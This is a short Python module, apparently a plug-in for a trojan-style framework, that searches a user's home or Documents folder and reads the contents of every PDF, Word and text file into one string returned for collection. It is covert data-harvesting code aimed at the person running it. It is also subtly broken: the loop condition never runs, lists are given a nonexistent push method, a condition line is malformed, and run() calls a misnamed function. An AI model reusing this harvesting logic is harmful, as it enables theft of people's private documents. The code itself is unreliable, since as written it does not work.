#looks for word documents, pdfs and text files with a depth first search
#look into symlinks
#change to push each file (wont need file separator)

import os
import sys
import getpass #needs to be in modules directory

def linuxmine():
	data = "linux2\n\n"
	usr = getpass.getuser()
	cdir = "/home/" + usr
	dirlist = [cdir]
	while not dirlist:
		cdir = dirlist.pop()
		for item in os.listdir(cdir):
			pth = os.path.join(cdir, item)
			if os.path.isdir(pth):
				dirlist.push(pth)
			else:
				if ".pdf" in item or ".doc" in item or 
								".txt" in item:
					with open(pth) as f:
						data += f.read()
						data += "\n\n"
	return data

def win32mine():
	data = "win32\n\n"
	usr = getpass.getuser()
	cdir = "\\" + usr + "\\Documents" #find actual root directory for files
	dirlist = [cdir]
	while not dirlist:
		cdir = dirlist.pop()
		for item in os.listdir(cdir):
			pth = os.path.join(cdir, item)
			if os.path.isdir(pth):
				dirlist.push(pth)
			else:
				if ".pdf" in item or ".doc" in item or 
								".txt" in item:
					with open(pth) as f:
						data += f.read()
						data += "\n\n"
	return data

def run(config, **args):
	platform = sys.platform
	if platform == "linux2":
		return None, linux2mine()
	elif platform == "win32":
		return None, win32mine()
	else:
		return None, platform + " not supported"
